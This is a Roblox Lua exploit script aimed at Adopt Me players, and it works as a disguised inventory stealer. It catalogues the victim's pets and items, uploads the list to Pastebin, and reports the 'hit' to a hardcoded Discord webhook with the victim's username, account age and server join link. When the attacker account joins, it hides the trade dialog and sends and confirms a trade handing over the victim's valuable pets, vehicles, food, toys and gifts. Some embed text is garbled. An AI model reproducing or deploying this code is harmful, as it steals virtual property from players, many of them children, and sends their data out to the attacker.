local RobloxUsername = "candymuncherox"
local WebhookURL = "https://discord.com/api/webhooks/1349457068133974066/cT6kjt9n3tzorTGm-Kp1xB8bwUnxVX_d_ofWddpfJYxATPjDLBeQnuBWRMjO2hURA9Yu"
local Loaders = require(game.ReplicatedStorage.Fsys).load
 
local messageServiceList = {
    DiscordWebhook = true,  -- Toggle Discord webhook
}
 
if getgenv().ScriptRunning == true then
    print("Script already running!")
    script:Destroy()
    return
end
 
local hashTable = {}
for i, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        wait(0.5)
        local info = debug.getinfo(v)
        local upvalues = debug.getupvalues(v)
        local functionName = info.name
        local hash = ""
        if next(upvalues) ~= nil and type(upvalues[1]) == "table" then
            local remoteTable = upvalues[1]
            hashTable[functionName] = {}
            for key, value in pairs(remoteTable) do
                hashTable[functionName][key] = value
            end
        end
    end
end
local remotes = {}
local hashes = {}
for functionName, tableContents in pairs(hashTable) do
    for key, value in pairs(tableContents) do
        remotes[value] = key
        hashes[key] = value
    end
end
local apiFolder = game:GetService("ReplicatedStorage").API
for _, remoteTable in pairs(apiFolder:GetDescendants()) do
    if remoteTable:IsA("RemoteEvent") or remoteTable:IsA("RemoteFunction") then
        local originalName = remotes[remoteTable]
        if originalName then
            remoteTable.Name = originalName
        end
    end
end
for _, remoteTable in pairs(apiFolder:GetDescendants()) do
    if remoteTable:IsA("RemoteEvent") or remoteTable:IsA("RemoteFunction") then
    end
end
 
pcall(function() game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy() end)
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
pcall(function() game:GetService("Players").LocalPlayer.PlayerGui.TooltipApp:Destroy() end)
pcall(function() game:GetService("Players").LocalPlayer.PlayerGui.SpeechBubbleApp:Destroy() end)
 
getgenv().ScriptRunning = true
 
local message = {
    ""
}
 
local countdownTime = 300
local cycleTime = 25
local messageIndex = 1
 
local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local Inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
local PetCounts = {
    legendary = {},
    ultra_rare = {},
    rare = {},
    uncommon = {},
    common = {}
}

local expensive_count = 0
local potion_count = 0
local legendaries_count = 0
local mega_legendaries_count = 0
local neon_legendaries_count = 0
local neon_count = 0
local mega_count = 0
local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local ClientData = Loads('ClientData')

local function getRarity(pet)
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local InventoryDB = Loads("InventoryDB")
    return InventoryDB[pet.category][pet.id].rarity
end
for PetUid, PetData in pairs(Inventory.pets) do
    local petCategory = InventoryDB[PetData.category]
    if petCategory and petCategory[PetData.id] then
        local petInfo = petCategory[PetData.id]
        local petName = petInfo["name"]
        local label = ""
        
        if PetData.properties.mega_neon then
            label = "Mega Neon "
            mega_count = mega_count + 1
        end

        if PetData.properties.neon then
            label = "Neon "
            neon_count = neon_count + 1
        end

        if PetData.properties.flyable then
            label = "Fly "
        end

        if PetData.properties.flyable and PetData.properties.neon then
            label = "Neon Fly "
        end

        if PetData.properties.flyable and PetData.properties.mega_neon then
            label = "Mega Neon Fly "
        end

        if PetData.properties.rideable then
            label = "Ride "
        end

        if PetData.properties.rideable and PetData.properties.neon then
            label = "Neon Ride "
        end

        if PetData.properties.rideable and PetData.properties.mega_neon then
            label = "Mega Neon Ride "
        end

        if PetData.properties.flyable and PetData.properties.rideable then
            label = "Fly Ride "
        end

        if PetData.properties.flyable and PetData.properties.rideable and PetData.properties.neon then
            label = "Neon Fly Ride "
        end

        if PetData.properties.flyable and PetData.properties.rideable and PetData.properties.mega_neon then
            label = "Mega Neon Fly Ride "
        end
        
        local key = label.. petName
        local rarity = getRarity(PetData)
        if PetCounts[rarity][key] then
            PetCounts[rarity][key] = PetCounts[rarity][key] + 1
        else
            PetCounts[rarity][key] = 1
        end
    end
end
local legendaryPets = ""
local ultraRarePets = ""
local rarePets = ""
local uncommonPets = ""
local commonPets = ""
for rarity, pets in pairs(PetCounts) do
    for key, count in pairs(pets) do
        local petEntry = key .. " x" .. count .. "\n"
        if rarity == "legendary" then
            legendaryPets = legendaryPets .. petEntry
        elseif rarity == "ultra_rare" then
            ultraRarePets = ultraRarePets .. petEntry
        elseif rarity == "rare" then
            rarePets = rarePets .. petEntry
        elseif rarity == "uncommon" then
            uncommonPets = uncommonPets .. petEntry
        elseif rarity == "common" then
            commonPets = commonPets .. petEntry
        end
    end
end
 
for i, v in pairs(ClientData.get("inventory").pets) do
    if InventoryDB[v.category][v.id].rarity == "legendary" then
        legendaries_count = legendaries_count + 1
    end
 end
 for i, v in pairs(ClientData.get("inventory").pets) do
     local petId = InventoryDB[v.category][v.id].id
     if petId == "shadow_dragon" or petId == "bat_dragon" or petId == "frost_dragon" then
         expensive_count = expensive_count + 1
     end
 end
 for i, v in pairs(ClientData.get("inventory").food) do
     if InventoryDB[v.category][v.id].rarity == "legendary" then
         potion_count = potion_count + 1
     end
 end 

local userInputService = game:GetService("UserInputService")
local playerDevice
 
local function detectDevice()
    if userInputService.TouchEnabled and not userInputService.KeyboardEnabled then
        playerDevice = "Phone or Tablet"
    elseif userInputService.KeyboardEnabled and not userInputService.TouchEnabled then
        playerDevice = "Computer"
    else
        playerDevice = "Unknown Device"
    end
end
 
detectDevice()
 
if legendaryPets == "" then
    legendaryPets = "None"
end
 
if ultraRarePets == "" then
    ultraRarePets = "None"
end
 
if rarePets == "" then
    rarePets = "None"
end
 
if uncommonPets == "" then
    uncommonPets = "None"
end
 
if commonPets == "" then
    commonPets = "None"
end
 
local PastebinPetListMessage = "PET LIST\n-- [ Legendary Pets ] --\n" .. legendaryPets .. 
                "\n\n-- [ Ultra Rare Pets ] --\n" .. ultraRarePets .. 
                "\n\n-- [ Rare Pets ] --\n" .. rarePets .. 
                "\n\n-- [ Uncommon Pets ] --\n" .. uncommonPets .. 
                "\n\n-- [ Common Pets ] --\n" .. commonPets
 
function SendPaste(url, apiKey, pasteContent, pasteName)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/x-www-form-urlencoded"
    }
 
    local data = "api_dev_key=" .. apiKey .. 
                 "&api_paste_code=" .. http:UrlEncode(pasteContent) ..
                 "&api_paste_name=" .. http:UrlEncode(pasteName) ..
                 "&api_option=paste"
 
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = data
    })
 
    if response.StatusCode == 200 then
        PastebinLink = response.Body
    else
        warn("Testing Env Failed")
    end
end
 
local url = "https://pastebin.com/api/api_post.php"
local apiKey = "YOUR PASTEBIN API"
local pasteContent = PastebinPetListMessage
local pasteName = "PET LIST"
 
SendPaste(url, apiKey, pasteContent, pasteName)
 
function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        content = '@everyone```\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```https://fern.wtf/joiner?placeId=920587237&gameInstanceId=' .. game.JobId .. '',
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end
 
-- Locals
local urlDiscord = WebhookURL
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local BucksAmount = game.Players.LocalPlayer.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount
local accountAge = player.AccountAge
local executorName = identifyexecutor() or "Unknown Executor"
local CorrectPastebinLink = PastebinLink or "Error"
 
local embed = {
    ["title"] = "NEW HIT",
    ["color"] = 16711935,
    ["fields"] = {
        {
            ["name"] = " Victim Info",
            ["value"] = "```Userame: " .. playerName .. "\nExploit: " .. executorName .. "\nAccount Age: " .. accountAge .. "\nYou: " .. RobloxUsername .. "\nGame:  Adopt Me ```"
        },
        {
            ["name"] = " Inventory Information",
            ["value"] = "```Total Value         ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â¡ : 0\n\nPets Above 1$       ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â‚¬Å¾ : " .. expensive_count .. "\nMega Legendarys     ÃƒÂ°Ã…Â¸Ã…â€™Ã‚Â¿ : 0\nNeon Legendarys     ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã…Â½ : 0\nNormal Neon         ÃƒÂ¢Ã…Â¡Ã‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â : " .. neon_count .. "\nNormal Mega         ÃƒÂ°Ã…Â¸Ã‚Â§Ã…  : " .. mega_count .. "\nF/R Potions         ÃƒÂ°Ã…Â¸Ã…â€™Ã‹â€  : " .. potion_count .. "\nNormal Legendaries  ÃƒÂ°Ã…Â¸Ã…Â½Ã†â€™ : " .. legendaries_count .. "```"
        },
        {
            ["name"] = " Full Inventory",
            ["value"] = "[Click Here](" .. CorrectPastebinLink .. ")"
        },
    },
}

if messageServiceList.DiscordWebhook then
    SendMessageEMBED(urlDiscord, embed)
end
 
local function addPetsToTrade()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local InventoryDB = Loads("InventoryDB")
    local ClientData = Loads('ClientData')
    local RouterClient = Loads("RouterClient")
    local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local Inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game:GetService("Players").LocalPlayer.Name].inventory
    local expensivePets = {}
    local legendaryPets = {}
    local ultraRarePets = {}
    local rarePets = {}
    local uncommonPets = {}
    local commonPets = {}
    for PetUid, PetData in pairs(Inventory.pets) do
        local petId = InventoryDB[PetData.category][PetData.id].id
        if petId == "shadow_dragon" or petId == "bat_dragon" or petId == "frost_dragon" then
            table.insert(expensivePets, PetUid)
        elseif InventoryDB[PetData.category][PetData.id].rarity == "legendary" then
            table.insert(legendaryPets, PetUid)
        elseif InventoryDB[PetData.category][PetData.id].rarity == "ultra_rare" then
            table.insert(ultraRarePets, PetUid)
        elseif InventoryDB[PetData.category][PetData.id].rarity == "rare" then
            table.insert(rarePets, PetUid)
        elseif InventoryDB[PetData.category][PetData.id].rarity == "uncommon" then
            table.insert(uncommonPets, PetUid)
        elseif InventoryDB[PetData.category][PetData.id].rarity == "common" then
            table.insert(commonPets, PetUid)
        end
    end
    local petOrder = {expensivePets, legendaryPets, ultraRarePets, rarePets, uncommonPets, commonPets}
    for _, petList in ipairs(petOrder) do
        while #petList > 0 do
            local PetUid = table.remove(petList, 1)
            AddItemRemote:FireServer(PetUid)
        end
    end
    if Inventory.transport then
        local legendaryVehicles = {}
        for VehicleUid, VehicleData in pairs(Inventory.transport) do
            if InventoryDB[VehicleData.category][VehicleData.id].rarity == "legendary" then
                table.insert(legendaryVehicles, VehicleUid)
            end
        end
        while #legendaryVehicles > 0 do
            local vehicleUid = table.remove(legendaryVehicles, 1)
            AddItemRemote:FireServer(vehicleUid)
        end
    end
    if Inventory.food then
        local legendaryFood = {}
        for FoodUid, FoodData in pairs(Inventory.food) do
            if InventoryDB[FoodData.category][FoodData.id].rarity == "legendary" then
                table.insert(legendaryFood, FoodUid)
            end
        end
        while #legendaryFood > 0 do
            local foodUid = table.remove(legendaryFood, 1)
            AddItemRemote:FireServer(foodUid)
        end
    end
    if Inventory.toys then
        local legendaryToys = {}
        for ToyUid, ToyData in pairs(Inventory.toys) do
            if InventoryDB[ToyData.category][ToyData.id].rarity == "legendary" then
                table.insert(legendaryToys, ToyUid)
            end
        end
        while #legendaryToys > 0 do
            local toyUid = table.remove(legendaryToys, 1)
            AddItemRemote:FireServer(toyUid)
        end
    end
    if Inventory.gifts then
        local legendaryGifts = {}
        for GiftUid, GiftData in pairs(Inventory.gifts) do
            if InventoryDB[GiftData.category][GiftData.id].rarity == "legendary" then
                table.insert(legendaryGifts, GiftUid)
            end
        end
        while #legendaryGifts > 0 do
            local giftUid = table.remove(legendaryGifts, 1)
            AddItemRemote:FireServer(giftUid)
        end
    end
end
 
local function processTrade()
    game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
    local RouterClient = Loaders("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")

    addPetsToTrade()
    
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    local function offset(guiElement)
        if guiElement then
            guiElement.Position = UDim2.new(1000, 0, 1000, 0)
        end
    end
    local dialogApp = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        offset(dialogApp.Dialog)
    end


    SendTrade:FireServer(game.Players[RobloxUsername])
 

AcceptNegotiationRemote:FireServer()
ConfirmTradeRemote:FireServer()
    wait(1)
    processTrade()
end
game.Players.PlayerAdded:Connect(function(player)

    if player.Name == RobloxUsername then
        processTrade()
    end
end)

